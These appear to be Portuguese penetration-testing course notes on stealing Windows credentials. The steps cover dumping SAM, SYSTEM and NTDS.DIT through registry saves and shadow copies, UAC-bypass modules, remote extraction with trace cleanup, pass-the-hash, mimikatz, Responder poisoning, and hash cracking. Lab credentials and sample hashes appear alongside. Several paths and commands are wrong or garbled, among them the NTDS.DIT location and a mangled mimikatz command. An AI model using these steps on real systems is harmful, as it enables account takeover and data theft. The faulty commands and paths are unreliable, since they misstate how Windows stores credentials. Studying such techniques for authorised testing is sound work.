

# Introdução

Para iniciar esse módulo é muito importante que entendamos o conceito de alguns arquivos presentes em máquinas Windows, são eles:

- `SAM`
    - Security Account Manager
    - `%SystemRoot%/system32/config/sam`
    - Armazena contas de usuários no Windows Desktop
- `NTDS.DIT`
    - Armazena dados de usuário no Windows Server AD
    - `%SystemRoot%/ntools/ntds-dit`
- `SYSTEM`
    - Arquivo necessário para decriptar SAM e NTDS.DIT, para explorar os demais precisaremos dele.
    - `%SystemRoot%/system32/system`

*Windows por padrão bloqueia a execução desses arquivos, então como acessá-los?

**Counter:**

- **Local** —> Boot com live CD pra captura de arquivos de Windows
- **Remoto:**
    - C:\Windows\Repair contém SAM (antigos)
    - reg save hklm\sam (Baixa arquivo baixando diretamente)
    - vssadmin (Baixa sombra do volume)

Como meta temos encontrar hashes nesses arquivo para que possamos explorar e encontrar novas senhas dos users do ambiente.

# Obtendo hashes de sistemas Windows

*`hashdump` —> Comando que o meterpreter permite que utiliza práticas para quebrar hashs do host atacado.

Ok mas e se caso eu não tiver meterpreter com a máquina??

*`hklm` —> hkey-local-machine

*`uac` —> Da bypass na tela que solicita confirmação yes or no para ação no Windows

`*Script [secretdumps.py](<http://secretdumps.py>) pode ajudar*`

### Passo a passo para acesso a hashs em sistemas antigos

1. Acessa o dir config e baixa arquivo **SAM (Talvez ocorra bloqueio) —> \Windows\system32\config\**
    
2. Acessa dir repair no C://Windows/ e baixa SAM e system
    
3. No Kali utiliza a aplicação `samdump2 <arquivo system> <arquivo sam>`
    
4. Caso não dê certo vamos baixar remotamente via
    
    1. `reg save hklm/sam <nome do novo arquivo>`
    2. `reg save hklm/system <nome do novo arquivo>`
5. Agora com os novos arquivos rode novamente o `samdump2` para obter hashes
    
    *Alternativa ao samdump2:
    
    `impacket-secretsdump -sam <arquivo sam> -system <arquivo system> LOCAL`
    
    _SEMPRE TESTAR OS DOIS,ELES PODEM DAR RESULTADOS DIFERENTES_
    

### Passo a passo para acesso a hashs em sistemas novos!

*Nesse caso precisaremos de acesso administrador

1. Abra um processo em background na shell de exploração do metasploit e faça uma pesquisa por bypass em uac
    1. `background`
    2. `search bypass uac`
2. Nesse exemplo usaremos o /exploit/windows/local/ask mas vale a pena notar que todos esses que aparecem na pesquisas são interessantes.
    1. `use /exploit/windows/local/ask`
    2. `session <sessão de shell com o Windows>`
    3. `lhost <>`
    4. `lport<>`
3. `/exploit/windows/local/bypass-fodhelper` : Outro exploit recomendado, cuidar o target e o payload a ser enviado
4. Depois de feito e aplicado esse processo na sessão que estava ativa explorando o alvo, ficará disponível o download remoto dos arquivos como SAM ou até mesmo um hashdump com meterpreter.

*`CONSIDERE O vssadmin create shadow /for=C:`

DICA: Use o copy para mover os arquivos `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM C:\\Users\\Public\\SAM.bak` : Clona novo SAM pra uma pasta de user

`copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Users\\Public\\SYSTEM.bak` : Clona novo SYSTEM para nova pasta user

### Obtendo hashes com RPC

1. Salvar as chaves do registro via RPC:
    
    ```bash
    
    #Conectar via RPC e salvar SAM
    proxychains4 -q reg.py ORIONSCORP/Administrador:admin123@172.16.2.253 save -keyName 'HKLM\\SAM' -o '\\\\Windows\\\\Temp'
    
    #Salvar SYSTEM
    proxychains4 -q reg.py ORIONSCORP/Administrador:admin123@172.16.2.253 save -keyName 'HKLM\\SYSTEM' -o '\\\\Windows\\\\Temp'
    ```
    
2. Conectar via SMB e baixar os arquivos:
    
    ```bash
    proxychains4 -q smbclient //172.16.2.253/C$ -U 'ORIONSCORP\\Administrador%admin123'
    
    smb: \\> cd Windows\\Temp
    smb: \\Windows\\Temp\\> ls SAM*
    smb: \\Windows\\Temp\\> ls SYSTEM*
    
    # Baixar os arquivos salvos
    smb: \\Windows\\Temp\\> get SAM.save
    smb: \\Windows\\Temp\\> get SYSTEM.save
    smb: \\Windows\\Temp\\> get SECURITY.save
    ```
    
3. Deletar os arquivos temporários (limpeza):
    
    ```bash
    smb: \\Windows\\Temp\\> del SAM.save
    smb: \\Windows\\Temp\\> del SYSTEM.save
    smb: \\Windows\\Temp\\> del SECURITY.save
    smb: \\Windows\\Temp\\> exit
    ```
    
4. Extrair hashes localmente:
    
    ```bash
    secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
    ```
    



---




# Obtendo hashes em servidores AD

Arquivo em foco: `NTDS.DIT`

### Passo a passo para coleta de informações de usuários em server AD

1. Acesse a shell do alvo com o comando shell, e acesso o diretório`/windows/ntds/ntds.dit`
    
2. Com o `vssadmin` faça o download de arquivos partindo de uma cópia sombra
    
    1. `vssadmin create shadow /for=c:` : Cria cópia sombra de todo o C: para explorarmos
3. Ao rodar o comando vssadmin será repassado o path para acesso a ele, realize o acesso e em seguida acesse `%SystemRoot%/ntools/ntds-dit`
    
    DICA: Use o copy pra clonar com o path
    
4. Pegue também o arquivo `system` do shadow, iremos precisar dele
    
5. Faça cópia desses arquivos para o desktop e realize download com meterpreter para o seu kali
    
6. Utilize o `impacket-secretdump -ntds <ntds.dit>` para decodificar
    



----




# Quebrando hashes (John)

**Após coletar todos os hashes possíveis, como quebra-los?**

### John the Ripper

Principal ferramenta para quebra de hashes, disponibiliza uma vasta database de itens para quebrar senhas e pode ser usado para diversos formatos de diversas formas.

Exemplo:

1. Coloque o hash em um arquivo vazio sem espaços
    
2. Rode o comando `john —format=<formato> <arquivo>`
    
    1. `john —help` : Ajuda sobre John
    2. `—wordlist<arquivo wordlist>` : Utilizando wordlist personalizada
    3. *Windows geralmente o formato é `nt`
    4. `--list=formats` : Lista formatos
    
    **Sistemas antigos podem ter o chamado hash LM, isso pode impactar ao rodar o john, recomendo rever o que foi feito no LAB e se certificar ao quebrar o hash em relação a LM e NT**
    
    - `—format:lm` (antigos)
    - `—format:nt`
    - EX: `john --format=raw-md5 --wordlist=/home/mytmsh/desec/wl.txt testeh.txt`

`IMPORTANTE`: Hash deve ser posto no arquivo testeh.txt a partir de certo ponto:

- ORIONSCORP2.LOCAL/thenrique:$DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d: (Vira)
    - $DCC2$10240#thenrique#bffd65356630d9a479f8e6761f56393d (Vai ao arquivo)

### Como validar credenciais encontradas?

Para validar as credenciais podemos fazer acessos e requisições variadas, para que dessa forma obtendo retorno nelas as senhas sejam confirmadas.

Ex:

- **smbclient** referenciando o usuário
- **rdp** utilizando a aplicação **xfreerdp**
    - `xfreerdp /u:<user> /p:<senha> /v<alvo>`
- `impact-secretdump` : Utilizando o impact e passando credenciais válidas para acesso ao alvo ele vai debulhar ele kkkk!
    - `impact-secretdump <user>:<senha>@<ip alvo>`




----





# Obtendo shell no host e Pass the hash

Via credenciais válidas é possível obter shell no host utilizando o winexe, esse item permite que você mande uma execução ao alvo Windows, caso mande um cmd.exe ele retorna a shell.

`winexe -U <user>%<passwd> //host <comando>`

Uma alternativa para isso é pesquisar no `metasploit` por `psexec` , passando as informações de usuário como SMBUser e SMBPass ele roda e explora bem o alvo…

### Pass the hash

É possível encontrar hashes e usa-los para bypassar senhas solicitadas pelo sistema

`pth-winexe -U <user>%<hash> //<iphost> <comando>`

Extremamente útil em casos em que você encontrou o hash mas não conseguiu quebra-lo em uma senha.

Acima temos o `winexe` que funciona via hash ao invés de senha

ou use um ainda **melhor**

1. Pegue os hashes:

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5c7dc3d2b51ff18dad26b26bb3192fdd:::
Suporte:1000:aad3b435b51404eeaad3b435b51404ee:f6dc832555645a2fec9df730a38fcc1b:::
```

1. Pegue o hash do `administrator` → aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24
2. E ponha no seguinte comando: `impacket-psexec -hashes <OS DOIS HASHS> <USER>[@](<mailto:Administrator@172.23.1.139>)<IP>`




----





# Obtendo hashes em cache

Diretório kali de referência: `/usr/share/windows-binaries/fgdump`

### Processo pra obtenção de hashes em cache

1. Via meterpreter realize o envio do arquivo fgdump.exe ao alvo
2. Acesse a shell do alvo e rode o fgdump.exe
3. Com o comando type realize a leitura de arquivos gerados pelo fgdump.exe no dir em que ele foi executado
4. O arquivo cachedump muitas vezes pode ter usuários em cache do AD o que é interessantíssimo para exploração

Dentro de `/usr/share/windows-binaries/` ou `/usr/share/windows-resources/`também existem outros utilitários que podem vir bem a calhar em um pentest:

- `wce` : Executável que ao rodar no alvo windows ele pode trazer até mesmo as senhas já traduzidas pra você
    - EX: `/usr/share/windows-resources/wce…`
    - `wce-univesal.exe -w` : Mostra as coisas já até traduzidas
        - Rodar dentro do windows
- `mimikatz` : Também pode trazer as mesmas funções mas com muitos outros recursos a serem explorados
    - No meterpreter pode ser mais simples…
    - `load mimikatz`
    - `mimikatz_command -f servelsa::wdi gest -a full`
- `load kiwi`: Funciona como mimikatz
    - `help` : Mostra como `usar`
    - `creds_all` : puxa tudo



----






# Swiss Army Knife para hashes…

`crackmapexec` : É o canivete suíço para pentests, isso pois ele permite diversas funções e atividades visando realizar ataques em alvos windows…

Exemplo: `crackmapexec smb 172.16.1.0/24` : Percorre rede inteira revisando falhas nas configurações de SMB e fazendo mapeamentos para auxiliar o pentester

Opções interessantes:

- `-h` : Demonstra funcionalidades do crackmapexec
- `-x` : Permite executar comandos
- `-L` : Mostra módulos disponíveis
- `—sam` : Tenta dumpar os hashes do SAM **`MUITO BOM PQP`**
- `--lsa` : Tenta pegar arquivos escondidos **`MUITO BOM PQP`**

O `crackmapexec` varia a ponto de poder fazer hashdumps, execução de comandos, enumeração de users e ainda muito mais funcionalidades…

**Vale a pena demais revisar se tem o crackmapexec pode te auxiliar em algo nos casos**



----






# Ataque NBT-NS/LLMNR

**Conceito do ataque:** Quando um host da rede não conhece um nome e o DNS Server também não conhece, ele em seguida faz uma requisição broadcast pra rede perguntando quem tem aquele hostname…

Com isso o ataque consiste em ter um agente malicioso que escuta essas solicitações e irá ser capaz de responder isso dizendo que o hostname é dele… A chamada broadcast é feito via um dos seguintes protocolos `NBT-NS`, `MDNS` e `LLMNR`

### Aplicação do ataque:

`responder` : Ferramenta capaz de responder as requisições de nome via broadcast

- `-v` : verbose
- `-r` : Resposta a Netbios
- `-I` : Interface escutando…
- `-P` : Força autenticação transparente (mais efetiva)
- ex: `responder -I <interface> -Prv`
- `-w` : Interessante revisar
- `-d` : Interessante revisar

*Ataque com alto nível de efetividade…

*Se o cara cair nisso tentando acessar rdp então… meu chapéu..

`—> Pra por no john bota o NTLMv2-SSP Hash inteiro, do user até todo o bloco`

ex:

```json
lotavio::ORIONSCORP2:7be3f87ce0d5a8c2:50B1031E0A1C66DAA59E4540EBF9E31B:01010000000000000080207C481CDC015954CFB9D38A5B9800000000020008004E0041004700470001001E00570049004E002D0057004B00300037004E0056004F004E0043004E00450004003400570049004E002D0057004B00300037004E0056004F004E0043004E0045002E004E004100470047002E004C004F00430041004C00030014004E004100470047002E004C004F00430041004C00050014004E004100470047002E004C004F00430041004C00070008000080207C481CDC0106000400020000000800300030000000000000000000000000200000C7148433F8DA2049F7F4D793F8706BB807776AD0519A384F53505A652BF6591D0A001000000000000000000000000000000000000900180063006900660073002F0073006500720076006100640032000000000000000000
```

e pra quebrar —> `hashcat -m 5600 <hashes> <wordlist> —force`

ou `john —format=netntlmv2 <hashes> <wordlists>`

### Pós ataque

Após conseguir as informações retornadas no responder acesse os módulos de quebra de hashes para aplicar os processos padrões… dessa forma conseguimos senhas repassadas no ambiente.

Vale a pena explorar outros recursos do responder que fazem quebras automáticas




----






# Código estilo John the Ripper….

[https://github.com/m4EDRE/hash/blob/main/quebrash.py](https://github.com/m4EDRE/hash/blob/main/quebrash.py)

### ReadMe

```
Versão necessária do Python: 3.12
Comando --> python3.12 quebrahash.py

john:$6$Y8aR0$Wu9zEcpH5HnCzXMCaFqv6BxzgZq7yyqfvuPFOpoU6Kf8s7YlQkUXz8QsZxD8.Kd5T03Yp2Zg3uzjX5QvziH7p1:19329:0:99999:7::: --> Linha de arquivo shadow..

john --> user
6 --> Tipo de hash
Y8aR0 --> Salt
Wu9zEcpH5HnCzXMCaFqv6BxzgZq7yyqfvuPFOpoU6Kf8s7YlQkUXz8QsZxD8.Kd5T03Yp2Zg3uzjX5QvziH7p1 --> Hash já com salt aplicado

Salt deve ser passado ao programa como -->  $6$Y8aR0
```

### Funcionamento

1. Solicita o hash
2. Solicita Salt contendo o formato da cypher também
3. Abre wordlist que contém diversas senhas
4. Aplica o salt em cada uma das senhas da wordlist
5. Compara o hash com a senha com o salt aplicado
6. Caso seja igual ele retorna positivo